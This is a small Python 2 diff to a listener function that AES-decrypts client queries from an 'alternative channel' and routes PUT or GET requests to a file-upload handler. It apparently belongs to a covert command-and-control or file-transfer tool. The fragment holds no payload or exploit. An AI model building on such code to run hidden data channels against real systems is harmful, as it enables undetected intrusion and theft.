@@ -294,7 +294,7 @@ def listen_alt_channel(timeout):
                 cipher = AES.new(base64.b64decode(raw_data.split(' ???? ')[0]))
                 decrypted_query = utils.DecodeAES(cipher, raw_data.split(' ???? ')[1])
 
-                if len(decrypted_query.split('_')) >= 2:
+                if 'PUT' in decrypted_query.split('_') or 'GET' in decrypted_query.split('_'):
                     # Upload file
                     print '[*] %s in uploading a file' % client_addr[0]
                     client = QueryApi.file_upload(client, client_addr[0], raw_data, decrypted_query)
